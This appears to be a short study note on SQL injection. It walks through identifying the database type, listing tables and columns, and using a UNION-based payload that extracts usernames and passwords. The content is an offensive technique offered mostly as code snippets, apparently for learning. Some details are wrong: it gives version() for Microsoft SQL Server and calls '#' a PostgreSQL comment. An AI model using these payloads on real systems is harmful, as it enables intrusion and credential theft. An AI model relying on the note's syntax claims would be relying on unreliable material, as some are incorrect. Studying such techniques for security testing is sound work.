# Examining the Database via SQL Injection

## Goal
When exploiting a SQL injection, one of the first steps after confirming the vulnerability is to **enumerate the database**.  
We want to discover:
- The **type and version** of the DBMS.
- The **tables** present in the database.
- The **columns** inside interesting tables.

This information forms the basis for deeper exploitation and data extraction.

---

## Techniques

### 1. Identifying Database Type and Version
Different databases have specific built-in queries for retrieving version information.

- **Oracle**
  ```sql
  SELECT banner FROM v$version;
  ```
- **MySQL & Microsoft**
    ```sql
    SELECT version();
    ```

### 2. Listing Database Tables
In this case we have to make a distinction between *Oracle* databases and *Non-Oracles* ones.
- For Non-Oracle databases we can use the standard view named **information schema** that gives us a view over the entire    database.
     ```sql
    SELECT table_name FROM information_schema.tables;
     ```
- For Oracle-specific databases we would use the **all_tables** view.
    ```sql
    SELECT table_name FROM all_tables;
    ```

### 3. Listing Columns of a Specific Table
- For Non-Oracle databases we can query **information_schema.columns** and in particular one of its columns named **column_name**.
    ```sql
    SELECT column_name 
    FROM information_schema.columns 
    WHERE table_name='users';
    ```
- For Oracle-specific databases we can query **all_tab_columns** and its column **column_name**.
    ```sql
    SELECT column_name 
    FROM all_tab_columns 
    WHERE table_name='USERS_TABLE';
    ```

### 4. Extracting Data
- Once the database tables and their columns have been identified we can proceed with **UNION-Based** queries to retreive sensitive infomation.
    ```sql
    ' UNION SELECT username, password FROM users--
    ```
## Notes
- Remember always to determine the **number of columns** returned by the vulnerable query, using `NULL` placeholders
- The **comment syntax** differs depending on the type of database:
    - `--` in Oracle, MySQL, SQL Server
    - `#` in MySQL, PostgreSQL